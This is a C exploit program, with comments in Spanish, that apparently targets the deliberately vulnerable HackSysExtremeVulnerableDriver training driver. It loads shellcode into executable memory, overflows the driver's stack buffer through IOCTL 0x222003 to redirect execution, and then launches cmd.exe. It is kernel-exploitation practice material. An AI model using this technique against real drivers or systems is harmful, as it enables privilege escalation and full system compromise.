#include <windows.h>
#include <stdio.h>

int main(void) {
    FILE* fp;
    long shellcode_size;
    LPVOID ptrMemory;
    HANDLE hHEVD;
    DWORD bytesReturned = 0;

    char buffer[2084];

    fp = fopen("sc.bin", "rb");
    if (!fp) {
        printf("[!] Error al acceder al shellcode.\n");
        return -1;
    }

    fseek(fp, 0, SEEK_END);
    shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    ptrMemory = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!ptrMemory) {
        printf("[!] Error al alocar memoria para el shellcode\n");
        return -1;
    }
    printf("[+] Memoria alocada correctamente, direccion del buffer = 0x%p\n", ptrMemory);

    fread(ptrMemory, shellcode_size, 1, fp);
    fclose(fp);

    printf("[+] Shellcode de %ld bytes cargado en memoria...\n", shellcode_size);


    printf("[*] Obteniendo un Handle para HackSysExtremeVulnerableDriver...\n");

    hHEVD = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        (GENERIC_READ | GENERIC_WRITE),
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hHEVD == INVALID_HANDLE_VALUE) {
        printf("[!] Error al obtener el handle. Codigo de error: %lu\n", GetLastError());
        return -1;
    }

    printf("[+] Handle obtenido con exito!\n");

    memset(buffer, 0x41, 2080);
    memcpy(buffer + 2080, &ptrMemory, 4);

    printf("[*] Llamando al codigo de control 0x222003...\n");

    BOOL result = DeviceIoControl(
        hHEVD,
        0x222003,
        buffer,
        sizeof(buffer), // NO ME LO COPIABA ANTES PQ TENIA strlen()
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {
        printf("[+] Error al llamar a DeviceIoControl. Codigo de error: %lu\n", GetLastError());
        return -1;
    }
    else {
        printf("[+] Llamada a DeviceIoControl finalizada\n");
    }

    CloseHandle(hHEVD);
    system("cmd.exe");


    return 0;
}